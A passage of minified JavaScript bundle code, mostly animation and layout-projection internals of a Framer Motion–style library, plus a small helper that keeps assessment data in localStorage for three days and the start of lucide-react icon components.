r=this.lead;if(e!==r&&(this.prevLead=r,this.lead=e,e.show(),r)){r.instance&&r.scheduleRender(),e.scheduleRender(),e.resumeFrom=r,n&&(e.resumeFrom.preserveOpacity=!0),r.snapshot&&(e.snapshot=r.snapshot,e.snapshot.latestValues=r.animationValues||r.latestValues),e.root&&e.root.isUpdating&&(e.isLayoutDirty=!0);const{crossfade:i}=e.options;i===!1&&r.hide()}}exitAnimationComplete(){this.members.forEach(e=>{const{options:n,resumingFrom:r}=e;n.onExitComplete&&n.onExitComplete(),r&&r.options.onExitComplete&&r.options.onExitComplete()})}scheduleRender(){this.members.forEach(e=>{e.instance&&e.scheduleRender(!1)})}removeLeadSnapshot(){this.lead&&this.lead.snapshot&&(this.lead.snapshot=void 0)}}function bD(t,e,n){let r="";const i=t.x.translate/e.x,s=t.y.translate/e.y,o=(n==null?void 0:n.z)||0;if((i||s||o)&&(r=`translate3d(${i}px, ${s}px, ${o}px) `),(e.x!==1||e.y!==1)&&(r+=`scale(${1/e.x}, ${1/e.y}) `),n){const{transformPerspective:u,rotate:c,rotateX:d,rotateY:f,skewX:h,skewY:p}=n;u&&(r=`perspective(${u}px) ${r}`),c&&(r+=`rotate(${c}deg) `),d&&(r+=`rotateX(${d}deg) `),f&&(r+=`rotateY(${f}deg) `),h&&(r+=`skewX(${h}deg) `),p&&(r+=`skewY(${p}deg) `)}const a=t.x.scale*e.x,l=t.y.scale*e.y;return(a!==1||l!==1)&&(r+=`scale(${a}, ${l})`),r||"none"}const Wd=["","X","Y","Z"],CD=1e3;let ED=0;function Kd(t,e,n,r){const{latestValues:i}=e;i[t]&&(n[t]=i[t],e.setStaticValue(t,0),r&&(r[t]=0))}function vb(t){if(t.hasCheckedOptimisedAppear=!0,t.root===t)return;const{visualElement:e}=t.options;if(!e)return;const n=ib(e);if(window.MotionHasOptimisedAnimation(n,"transform")){const{layout:i,layoutId:s}=t.options;window.MotionCancelOptimisedAnimation(n,"transform",oe,!(i||s))}const{parent:r}=t;r&&!r.hasCheckedOptimisedAppear&&vb(r)}function wb({attachResizeListener:t,defaultParent:e,measureScroll:n,checkIsScrollRoot:r,resetTransform:i}){return class{constructor(o={},a=e==null?void 0:e()){this.id=ED++,this.animationId=0,this.animationCommitId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.hasCheckedOptimisedAppear=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.updateScheduled=!1,this.scheduleUpdate=()=>this.update(),this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,this.nodes.forEach(ND),this.nodes.forEach(OD),this.nodes.forEach(DD),this.nodes.forEach(AD)},this.resolvedRelativeTargetAt=0,this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=o,this.root=a?a.root||a:this,this.path=a?[...a.path,a]:[],this.parent=a,this.depth=a?a.depth+1:0;for(let l=0;l<this.path.length;l++)this.path[l].shouldResetTransform=!0;this.root===this&&(this.nodes=new fD)}addEventListener(o,a){return this.eventHandlers.has(o)||this.eventHandlers.set(o,new Pm),this.eventHandlers.get(o).add(a)}notifyListeners(o,...a){const l=this.eventHandlers.get(o);l&&l.notify(...a)}hasListeners(o){return this.eventHandlers.has(o)}mount(o){if(this.instance)return;this.isSVG=Lk(o)&&!yR(o),this.instance=o;const{layoutId:a,layout:l,visualElement:u}=this.options;if(u&&!u.current&&u.mount(o),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),this.root.hasTreeAnimated&&(l||a)&&(this.isLayoutDirty=!0),t){let c,d=0;const f=()=>this.root.updateBlockedByResize=!1;oe.read(()=>{d=window.innerWidth}),t(o,()=>{const h=window.innerWidth;h!==d&&(d=h,this.root.updateBlockedByResize=!0,c&&c(),c=hD(f,250),Vl.hasAnimatedSinceResize&&(Vl.hasAnimatedSinceResize=!1,this.nodes.forEach(xx)))})}a&&this.root.registerSharedNode(a,this),this.options.animate!==!1&&u&&(a||l)&&this.addEventListener("didUpdate",({delta:c,hasLayoutChanged:d,hasRelativeLayoutChanged:f,layout:h})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const p=this.options.transition||u.getDefaultTransition()||BD,{onLayoutAnimationStart:y,onLayoutAnimationComplete:x}=u.getProps(),g=!this.targetLayout||!xb(this.targetLayout,h),v=!d&&f;if(this.options.layoutRoot||this.resumeFrom||v||d&&(g||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0);const w={...Hm(p,"layout"),onPlay:y,onComplete:x};(u.shouldReduceMotion||this.options.layoutRoot)&&(w.delay=0,w.type=!1),this.startAnimation(w),this.setAnimationOrigin(c,v)}else d||xx(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=h})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const o=this.getStack();o&&o.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,this.eventHandlers.clear(),Rr(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(LD),this.animationId++)}getTransformTemplate(){const{visualElement:o}=this.options;return o&&o.getProps().transformTemplate}willUpdate(o=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(window.MotionCancelOptimisedAnimation&&!this.hasCheckedOptimisedAppear&&vb(this),!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let c=0;c<this.path.length;c++){const d=this.path[c];d.shouldResetTransform=!0,d.updateScroll("snapshot"),d.options.layoutRoot&&d.willUpdate(!1)}const{layoutId:a,layout:l}=this.options;if(a===void 0&&!l)return;const u=this.getTransformTemplate();this.prevTransformTemplateValue=u?u(this.latestValues,""):void 0,this.updateSnapshot(),o&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(gx);return}if(this.animationId<=this.animationCommitId){this.nodes.forEach(yx);return}this.animationCommitId=this.animationId,this.isUpdating?(this.isUpdating=!1,this.nodes.forEach(RD),this.nodes.forEach(TD),this.nodes.forEach(MD)):this.nodes.forEach(yx),this.clearAllSnapshots();const a=gt.now();He.delta=Kn(0,1e3/60,a-He.timestamp),He.timestamp=a,He.isProcessing=!0,Ld.update.process(He),Ld.preRender.process(He),Ld.render.process(He),He.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,Wm.read(this.scheduleUpdate))}clearAllSnapshots(){this.nodes.forEach(PD),this.sharedNodes.forEach(ID)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,oe.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){oe.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure(),this.snapshot&&!st(this.snapshot.measuredBox.x)&&!st(this.snapshot.measuredBox.y)&&(this.snapshot=void 0))}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let l=0;l<this.path.length;l++)this.path[l].updateScroll();const o=this.layout;this.layout=this.measure(!1),this.layoutCorrected=ke(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:a}=this.options;a&&a.notify("LayoutMeasure",this.layout.layoutBox,o?o.layoutBox:void 0)}updateScroll(o="measure"){let a=!!(this.options.layoutScroll&&this.instance);if(this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===o&&(a=!1),a&&this.instance){const l=r(this.instance);this.scroll={animationId:this.root.animationId,phase:o,isRoot:l,offset:n(this.instance),wasRoot:this.scroll?this.scroll.isRoot:l}}}resetTransform(){if(!i)return;const o=this.isLayoutDirty||this.shouldResetTransform||this.options.alwaysMeasureLayout,a=this.projectionDelta&&!yb(this.projectionDelta),l=this.getTransformTemplate(),u=l?l(this.latestValues,""):void 0,c=u!==this.prevTransformTemplateValue;o&&this.instance&&(a||Kr(this.latestValues)||c)&&(i(this.instance,u),this.shouldResetTransform=!1,this.scheduleRender())}measure(o=!0){const a=this.measurePageBox();let l=this.removeElementScroll(a);return o&&(l=this.removeTransform(l)),VD(l),{animationId:this.root.animationId,measuredBox:a,layoutBox:l,latestValues:{},source:this.id}}measurePageBox(){var u;const{visualElement:o}=this.options;if(!o)return ke();const a=o.measureViewportBox();if(!(((u=this.scroll)==null?void 0:u.wasRoot)||this.path.some(zD))){const{scroll:c}=this.root;c&&(Xi(a.x,c.offset.x),Xi(a.y,c.offset.y))}return a}removeElementScroll(o){var l;const a=ke();if(Dt(a,o),(l=this.scroll)!=null&&l.wasRoot)return a;for(let u=0;u<this.path.length;u++){const c=this.path[u],{scroll:d,options:f}=c;c!==this.root&&d&&f.layoutScroll&&(d.wasRoot&&Dt(a,o),Xi(a.x,d.offset.x),Xi(a.y,d.offset.y))}return a}applyTransform(o,a=!1){const l=ke();Dt(l,o);for(let u=0;u<this.path.length;u++){const c=this.path[u];!a&&c.options.layoutScroll&&c.scroll&&c!==c.root&&Zi(l,{x:-c.scroll.offset.x,y:-c.scroll.offset.y}),Kr(c.latestValues)&&Zi(l,c.latestValues)}return Kr(this.latestValues)&&Zi(l,this.latestValues),l}removeTransform(o){const a=ke();Dt(a,o);for(let l=0;l<this.path.length;l++){const u=this.path[l];if(!u.instance||!Kr(u.latestValues))continue;Lh(u.latestValues)&&u.updateSnapshot();const c=ke(),d=u.measurePageBox();Dt(c,d),cx(a,u.latestValues,u.snapshot?u.snapshot.layoutBox:void 0,c)}return Kr(this.latestValues)&&cx(a,this.latestValues),a}setTargetDelta(o){this.targetDelta=o,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(o){this.options={...this.options,...o,crossfade:o.crossfade!==void 0?o.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==He.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(o=!1){var f;const a=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=a.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=a.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=a.isSharedProjectionDirty);const l=!!this.resumingFrom||this!==a;if(!(o||l&&this.isSharedProjectionDirty||this.isProjectionDirty||(f=this.parent)!=null&&f.isProjectionDirty||this.attemptToResolveRelativeTarget||this.root.updateBlockedByResize))return;const{layout:c,layoutId:d}=this.options;if(!(!this.layout||!(c||d))){if(this.resolvedRelativeTargetAt=He.timestamp,!this.targetDelta&&!this.relativeTarget){const h=this.getClosestProjectingParent();h&&h.layout&&this.animationProgress!==1?(this.relativeParent=h,this.forceRelativeParentToResolveTarget(),this.relativeTarget=ke(),this.relativeTargetOrigin=ke(),To(this.relativeTargetOrigin,this.layout.layoutBox,h.layout.layoutBox),Dt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}if(!(!this.relativeTarget&&!this.targetDelta)&&(this.target||(this.target=ke(),this.targetWithTransforms=ke()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),KO(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):Dt(this.target,this.layout.layoutBox),Xk(this.target,this.targetDelta)):Dt(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget)){this.attemptToResolveRelativeTarget=!1;const h=this.getClosestProjectingParent();h&&!!h.resumingFrom==!!this.resumingFrom&&!h.options.layoutScroll&&h.target&&this.animationProgress!==1?(this.relativeParent=h,this.forceRelativeParentToResolveTarget(),this.relativeTarget=ke(),this.relativeTargetOrigin=ke(),To(this.relativeTargetOrigin,this.target,h.target),Dt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}}}getClosestProjectingParent(){if(!(!this.parent||Lh(this.parent.latestValues)||Qk(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}calcProjection(){var p;const o=this.getLead(),a=!!this.resumingFrom||this!==o;let l=!0;if((this.isProjectionDirty||(p=this.parent)!=null&&p.isProjectionDirty)&&(l=!1),a&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(l=!1),this.resolvedRelativeTargetAt===He.timestamp&&(l=!1),l)return;const{layout:u,layoutId:c}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(u||c))return;Dt(this.layoutCorrected,this.layout.layoutBox);const d=this.treeScale.x,f=this.treeScale.y;iO(this.layoutCorrected,this.treeScale,this.path,a),o.layout&&!o.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(o.target=o.layout.layoutBox,o.targetWithTransforms=ke());const{target:h}=o;if(!h){this.prevProjectionDelta&&(this.createProjectionDeltas(),this.scheduleRender());return}!this.projectionDelta||!this.prevProjectionDelta?this.createProjectionDeltas():(ax(this.prevProjectionDelta.x,this.projectionDelta.x),ax(this.prevProjectionDelta.y,this.projectionDelta.y)),Eo(this.projectionDelta,this.layoutCorrected,h,this.latestValues),(this.treeScale.x!==d||this.treeScale.y!==f||!mx(this.projectionDelta.x,this.prevProjectionDelta.x)||!mx(this.projectionDelta.y,this.prevProjectionDelta.y))&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",h))}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(o=!0){var a;if((a=this.options.visualElement)==null||a.scheduleRender(),o){const l=this.getStack();l&&l.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}createProjectionDeltas(){this.prevProjectionDelta=es(),this.projectionDelta=es(),this.projectionDeltaWithTransform=es()}setAnimationOrigin(o,a=!1){const l=this.snapshot,u=l?l.latestValues:{},c={...this.latestValues},d=es();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!a;const f=ke(),h=l?l.source:void 0,p=this.layout?this.layout.source:void 0,y=h!==p,x=this.getStack(),g=!x||x.members.length<=1,v=!!(y&&!g&&this.options.crossfade===!0&&!this.path.some(FD));this.animationProgress=0;let w;this.mixTargetDelta=b=>{const k=b/1e3;vx(d.x,o.x,k),vx(d.y,o.y,k),this.setTargetDelta(d),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(To(f,this.layout.layoutBox,this.relativeParent.layout.layoutBox),jD(this.relativeTarget,this.relativeTargetOrigin,f,k),w&&SD(this.relativeTarget,w)&&(this.isProjectionDirty=!1),w||(w=ke()),Dt(w,this.relativeTarget)),y&&(this.animationValues=c,mD(c,u,this.latestValues,k,v,g)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=k},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(o){var a,l,u;this.notifyListeners("animationStart"),(a=this.currentAnimation)==null||a.stop(),(u=(l=this.resumingFrom)==null?void 0:l.currentAnimation)==null||u.stop(),this.pendingAnimation&&(Rr(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=oe.update(()=>{Vl.hasAnimatedSinceResize=!0,this.motionValue||(this.motionValue=ws(0)),this.currentAnimation=cD(this.motionValue,[0,1e3],{...o,velocity:0,isSync:!0,onUpdate:c=>{this.mixTargetDelta(c),o.onUpdate&&o.onUpdate(c)},onStop:()=>{},onComplete:()=>{o.onComplete&&o.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const o=this.getStack();o&&o.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(CD),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const o=this.getLead();let{targetWithTransforms:a,target:l,layout:u,latestValues:c}=o;if(!(!a||!l||!u)){if(this!==o&&this.layout&&u&&Sb(this.options.animationType,this.layout.layoutBox,u.layoutBox)){l=this.target||ke();const d=st(this.layout.layoutBox.x);l.x.min=o.target.x.min,l.x.max=l.x.min+d;const f=st(this.layout.layoutBox.y);l.y.min=o.target.y.min,l.y.max=l.y.min+f}Dt(a,l),Zi(a,c),Eo(this.projectionDeltaWithTransform,this.layoutCorrected,a,c)}}registerSharedNode(o,a){this.sharedNodes.has(o)||this.sharedNodes.set(o,new kD),this.sharedNodes.get(o).add(a);const u=a.options.initialPromotionConfig;a.promote({transition:u?u.transition:void 0,preserveFollowOpacity:u&&u.shouldPreserveFollowOpacity?u.shouldPreserveFollowOpacity(a):void 0})}isLead(){const o=this.getStack();return o?o.lead===this:!0}getLead(){var a;const{layoutId:o}=this.options;return o?((a=this.getStack())==null?void 0:a.lead)||this:this}getPrevLead(){var a;const{layoutId:o}=this.options;return o?(a=this.getStack())==null?void 0:a.prevLead:void 0}getStack(){const{layoutId:o}=this.options;if(o)return this.root.sharedNodes.get(o)}promote({needsReset:o,transition:a,preserveFollowOpacity:l}={}){const u=this.getStack();u&&u.promote(this,l),o&&(this.projectionDelta=void 0,this.needsReset=!0),a&&this.setOptions({transition:a})}relegate(){const o=this.getStack();return o?o.relegate(this):!1}resetSkewAndRotation(){const{visualElement:o}=this.options;if(!o)return;let a=!1;const{latestValues:l}=o;if((l.z||l.rotate||l.rotateX||l.rotateY||l.rotateZ||l.skewX||l.skewY)&&(a=!0),!a)return;const u={};l.z&&Kd("z",o,u,this.animationValues);for(let c=0;c<Wd.length;c++)Kd(`rotate${Wd[c]}`,o,u,this.animationValues),Kd(`skew${Wd[c]}`,o,u,this.animationValues);o.render();for(const c in u)o.setStaticValue(c,u[c]),this.animationValues&&(this.animationValues[c]=u[c]);o.scheduleRender()}applyProjectionStyles(o,a){if(!this.instance||this.isSVG)return;if(!this.isVisible){o.visibility="hidden";return}const l=this.getTransformTemplate();if(this.needsReset){this.needsReset=!1,o.visibility="",o.opacity="",o.pointerEvents=Bl(a==null?void 0:a.pointerEvents)||"",o.transform=l?l(this.latestValues,""):"none";return}const u=this.getLead();if(!this.projectionDelta||!this.layout||!u.target){this.options.layoutId&&(o.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,o.pointerEvents=Bl(a==null?void 0:a.pointerEvents)||""),this.hasProjected&&!Kr(this.latestValues)&&(o.transform=l?l({},""):"none",this.hasProjected=!1);return}o.visibility="";const c=u.animationValues||u.latestValues;this.applyTransformsToTarget();let d=bD(this.projectionDeltaWithTransform,this.treeScale,c);l&&(d=l(c,d)),o.transform=d;const{x:f,y:h}=this.projectionDelta;o.transformOrigin=`${f.origin*100}% ${h.origin*100}% 0`,u.animationValues?o.opacity=u===this?c.opacity??this.latestValues.opacity??1:this.preserveOpacity?this.latestValues.opacity:c.opacityExit:o.opacity=u===this?c.opacity!==void 0?c.opacity:"":c.opacityExit!==void 0?c.opacityExit:0;for(const p in sa){if(c[p]===void 0)continue;const{correct:y,applyTo:x,isCSSVariable:g}=sa[p],v=d==="none"?c[p]:y(c[p],u);if(x){const w=x.length;for(let b=0;b<w;b++)o[x[b]]=v}else g?this.options.visualElement.renderState.vars[p]=v:o[p]=v}this.options.layoutId&&(o.pointerEvents=u===this?Bl(a==null?void 0:a.pointerEvents)||"":"none")}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(o=>{var a;return(a=o.currentAnimation)==null?void 0:a.stop()}),this.root.nodes.forEach(gx),this.root.sharedNodes.clear()}}}function TD(t){t.updateLayout()}function MD(t){var n;const e=((n=t.resumeFrom)==null?void 0:n.snapshot)||t.snapshot;if(t.isLead()&&t.layout&&e&&t.hasListeners("didUpdate")){const{layoutBox:r,measuredBox:i}=t.layout,{animationType:s}=t.options,o=e.source!==t.layout.source;s==="size"?It(d=>{const f=o?e.measuredBox[d]:e.layoutBox[d],h=st(f);f.min=r[d].min,f.max=f.min+h}):Sb(s,e.layoutBox,r)&&It(d=>{const f=o?e.measuredBox[d]:e.layoutBox[d],h=st(r[d]);f.max=f.min+h,t.relativeTarget&&!t.currentAnimation&&(t.isProjectionDirty=!0,t.relativeTarget[d].max=t.relativeTarget[d].min+h)});const a=es();Eo(a,r,e.layoutBox);const l=es();o?Eo(l,t.applyTransform(i,!0),e.measuredBox):Eo(l,r,e.layoutBox);const u=!yb(a);let c=!1;if(!t.resumeFrom){const d=t.getClosestProjectingParent();if(d&&!d.resumeFrom){const{snapshot:f,layout:h}=d;if(f&&h){const p=ke();To(p,e.layoutBox,f.layoutBox);const y=ke();To(y,r,h.layoutBox),xb(p,y)||(c=!0),d.options.layoutRoot&&(t.relativeTarget=y,t.relativeTargetOrigin=p,t.relativeParent=d)}}}t.notifyListeners("didUpdate",{layout:r,snapshot:e,delta:l,layoutDelta:a,hasLayoutChanged:u,hasRelativeLayoutChanged:c})}else if(t.isLead()){const{onExitComplete:r}=t.options;r&&r()}t.options.transition=void 0}function ND(t){t.parent&&(t.isProjecting()||(t.isProjectionDirty=t.parent.isProjectionDirty),t.isSharedProjectionDirty||(t.isSharedProjectionDirty=!!(t.isProjectionDirty||t.parent.isProjectionDirty||t.parent.isSharedProjectionDirty)),t.isTransformDirty||(t.isTransformDirty=t.parent.isTransformDirty))}function AD(t){t.isProjectionDirty=t.isSharedProjectionDirty=t.isTransformDirty=!1}function PD(t){t.clearSnapshot()}function gx(t){t.clearMeasurements()}function yx(t){t.isLayoutDirty=!1}function RD(t){const{visualElement:e}=t.options;e&&e.getProps().onBeforeLayoutMeasure&&e.notify("BeforeLayoutMeasure"),t.resetTransform()}function xx(t){t.finishAnimation(),t.targetDelta=t.relativeTarget=t.target=void 0,t.isProjectionDirty=!0}function OD(t){t.resolveTargetDelta()}function DD(t){t.calcProjection()}function LD(t){t.resetSkewAndRotation()}function ID(t){t.removeLeadSnapshot()}function vx(t,e,n){t.translate=ce(e.translate,0,n),t.scale=ce(e.scale,1,n),t.origin=e.origin,t.originPoint=e.originPoint}function wx(t,e,n,r){t.min=ce(e.min,n.min,r),t.max=ce(e.max,n.max,r)}function jD(t,e,n,r){wx(t.x,e.x,n.x,r),wx(t.y,e.y,n.y,r)}function FD(t){return t.animationValues&&t.animationValues.opacityExit!==void 0}const BD={duration:.45,ease:[.4,0,.1,1]},Sx=t=>typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().includes(t),kx=Sx("applewebkit/")&&!Sx("chrome/")?Math.round:Ut;function bx(t){t.min=kx(t.min),t.max=kx(t.max)}function VD(t){bx(t.x),bx(t.y)}function Sb(t,e,n){return t==="position"||t==="preserve-aspect"&&!WO(px(e),px(n),.2)}function zD(t){var e;return t!==t.root&&((e=t.scroll)==null?void 0:e.wasRoot)}const _D=wb({attachResizeListener:(t,e)=>oa(t,"resize",e),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body.scrollLeft,y:document.documentElement.scrollTop||document.body.scrollTop}),checkIsScrollRoot:()=>!0}),qd={current:void 0},kb=wb({measureScroll:t=>({x:t.scrollLeft,y:t.scrollTop}),defaultParent:()=>{if(!qd.current){const t=new _D({});t.mount(window),t.setOptions({layoutScroll:!0}),qd.current=t}return qd.current},resetTransform:(t,e)=>{t.style.transform=e!==void 0?e:"none"},checkIsScrollRoot:t=>window.getComputedStyle(t).position==="fixed"}),$D={pan:{Feature:oD},drag:{Feature:sD,ProjectionNode:kb,MeasureLayout:pb}};function Cx(t,e,n){const{props:r}=t;t.animationState&&r.whileHover&&t.animationState.setActive("whileHover",n==="Start");const i="onHover"+n,s=r[i];s&&oe.postRender(()=>s(e,Oa(e)))}class HD extends Br{mount(){const{current:e}=this.node;e&&(this.unmount=fR(e,(n,r)=>(Cx(this.node,r,"Start"),i=>Cx(this.node,i,"End"))))}unmount(){}}class UD extends Br{constructor(){super(...arguments),this.isActive=!1}onFocus(){let e=!1;try{e=this.node.current.matches(":focus-visible")}catch{e=!0}!e||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=Aa(oa(this.node.current,"focus",()=>this.onFocus()),oa(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}function Ex(t,e,n){const{props:r}=t;if(t.current instanceof HTMLButtonElement&&t.current.disabled)return;t.animationState&&r.whileTap&&t.animationState.setActive("whileTap",n==="Start");const i="onTap"+(n==="End"?"":n),s=r[i];s&&oe.postRender(()=>s(e,Oa(e)))}class WD extends Br{mount(){const{current:e}=this.node;e&&(this.unmount=gR(e,(n,r)=>(Ex(this.node,r,"Start"),(i,{success:s})=>Ex(this.node,i,s?"End":"Cancel")),{useGlobalTarget:this.node.props.globalTapTarget}))}unmount(){}}const _h=new WeakMap,Gd=new WeakMap,KD=t=>{const e=_h.get(t.target);e&&e(t)},qD=t=>{t.forEach(KD)};function GD({root:t,...e}){const n=t||document;Gd.has(n)||Gd.set(n,{});const r=Gd.get(n),i=JSON.stringify(e);return r[i]||(r[i]=new IntersectionObserver(qD,{root:t,...e})),r[i]}function JD(t,e,n){const r=GD(e);return _h.set(t,n),r.observe(t),()=>{_h.delete(t),r.unobserve(t)}}const YD={some:0,all:1};class QD extends Br{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();const{viewport:e={}}=this.node.getProps(),{root:n,margin:r,amount:i="some",once:s}=e,o={root:n?n.current:void 0,rootMargin:r,threshold:typeof i=="number"?i:YD[i]},a=l=>{const{isIntersecting:u}=l;if(this.isInView===u||(this.isInView=u,s&&!u&&this.hasEnteredView))return;u&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",u);const{onViewportEnter:c,onViewportLeave:d}=this.node.getProps(),f=u?c:d;f&&f(l)};return JD(this.node.current,o,a)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:e,prevProps:n}=this.node;["amount","margin","root"].some(XD(e,n))&&this.startObserver()}unmount(){}}function XD({viewport:t={}},{viewport:e={}}={}){return n=>t[n]!==e[n]}const ZD={inView:{Feature:QD},tap:{Feature:WD},focus:{Feature:UD},hover:{Feature:HD}},eL={layout:{ProjectionNode:kb,MeasureLayout:pb}},tL={...VO,...ZD,...$D,...eL},I=tO(tL,pO),Tx="assessment_user_data",rg="assessment_data",nL=3,rL=()=>{try{const t=localStorage.getItem(Tx);if(!t)return null;const e=JSON.parse(t),n=Date.now(),r=e.timestamp+nL*24*60*60*1e3;return n>r?(localStorage.removeItem(Tx),localStorage.removeItem(rg),null):e}catch(t){return console.error("Error retrieving user data:",t),null}},Mx=t=>{localStorage.setItem(rg,JSON.stringify(t))},bb=()=>{try{const t=localStorage.getItem(rg);return t?JSON.parse(t):null}catch(t){return console.error("Error retrieving assessment data:",t),null}};/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */var iL={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const sL=t=>t.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase().trim(),Ve=(t,e)=>{const n=S.forwardRef(({color:r="currentColor",size:i=24,strokeWidth:s=2,absoluteStrokeWidth:o,className:a="",children:l,...u},c)=>S.createElement("svg",{ref:c,...iL,width:i,height:i,stroke:r,strokeWidth:o?Number(s)*24/Number(i):s,className:["lucide",`lucide-${sL(t)}`,a].join(" "),...u},[...e.map(([d,f])=>S.createElement(d,f)),...Array.isArray(l)?l:[l]]));return n.displayName=`${t}`,n};/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
